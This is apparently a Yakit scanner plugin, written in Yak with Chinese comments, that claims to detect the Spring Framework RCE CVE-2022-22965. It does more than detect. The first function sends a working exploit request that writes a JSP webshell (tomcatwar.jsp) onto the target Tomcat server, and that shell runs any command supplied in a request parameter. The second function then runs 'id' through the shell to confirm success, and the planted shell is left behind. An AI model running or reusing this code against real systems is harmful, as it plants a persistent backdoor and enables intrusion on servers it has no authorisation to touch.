# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()
//SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞检测
//SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞检测.yak

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
`
    _,_,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    return

}

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /tomcatwar.jsp?pwd=j&cmd=id HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAllOfSubString(rsp, `uid=[0-9]+\(.*\) gid=[0-9]+\(.*\) groups=[0-9]+\(.*\)`){
            yakit.Info("%v found SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞存在"),
            risk.type("RCE[Spring Framework]"),
            risk.payload(`/tomcatwar.jsp?pwd=j&cmd=id`),
        )
        }else{
            println("不存在SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞")
            }
       
    }
    //   if len(rsp) > 0 {
    //     header, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    //     reg = re.MustCompile(`Result(.*)'],`)
    //     if reg == nil {
    //         log.info("正则解析失败")
    //         yakit.Error("正则解析失败")
    //         return
    //     }

    //     //提取关键字
    //     res = reg.FindAllStringSubmatch(string(body), -1)
    //     log.info("[id] 命令执行结果：%v", res)
    //     if str.MatchAllOfSubString(header, "HTTP/1.1 200 OK") && str.MatchAllOfSubString(res, "uid=") {
    //         yakit.Info("%v found SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞检测", addr)
    //         risk.NewRisk(
    //         addr,risk.title("CVE-2022-22965"),
    //         risk.severity("high"),
    //         risk.titleVerbose("SpringFrameworkJDK>=9_CVE-2022-22965远程代码执行漏洞检测"),
    //         risk.type("rce[Spring Framework]"),
    //         risk.payload(`"value": "/tomcatwar.jsp?pwd=j&cmd=id"`),
    //     )
    //     }
       
    // }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck1(result.Target,result.Port)
        handleCheck(result.Target,result.Port)
    }
    
}